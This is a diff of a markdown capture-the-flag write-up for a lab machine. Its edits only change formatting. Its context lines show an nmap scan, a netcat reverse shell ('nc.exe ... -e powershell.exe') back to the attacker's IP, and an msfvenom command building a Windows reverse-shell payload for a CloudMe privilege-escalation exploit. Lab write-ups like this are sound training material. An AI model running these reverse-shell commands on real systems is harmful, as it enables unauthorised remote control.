@@ -1,4 +1,4 @@
-**Nmap Scan:**
+## Nmap Scan:
 ```
 # Nmap 7.92 scan initiated Wed Jan  4 22:55:01 2023 as: nmap -sC -sV -p- -vv -oA full 10.10.10.198
 Nmap scan report for 10.10.10.198
@@ -47,7 +47,6 @@ copy \\10.10.14.2\kali\nc.exe
 .\nc.exe 10.10.14.2 443 -e powershell.exe
 ```
 
----
 # Privilege Escalation
 
 First, I enumerated the machine manually, and while grabbing the ```user.txt``` flag I saw this:
@@ -61,7 +60,7 @@ netstat -ano
 TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       7088
 TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       2820
 ```
-**3306:** MySQL Service, which made sense since it was using the PHP site.
+**3306:** MySQL Service, which made sense since it was using the PHP site. </br>
 **8888:** The port that was associated with ```CloudMe``` service.
 
 To verify it, I grabbed the process ID and found it on the tasklist:
@@ -99,5 +98,5 @@ msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=1234 -b '\x0
 I replaced the original payload with the modified one, listened to port 1234 on another tab and ran the exploit.
 ```
 
-And it worked:
+And it worked: </br>
 ![privesc](images/buff/privesc.png)
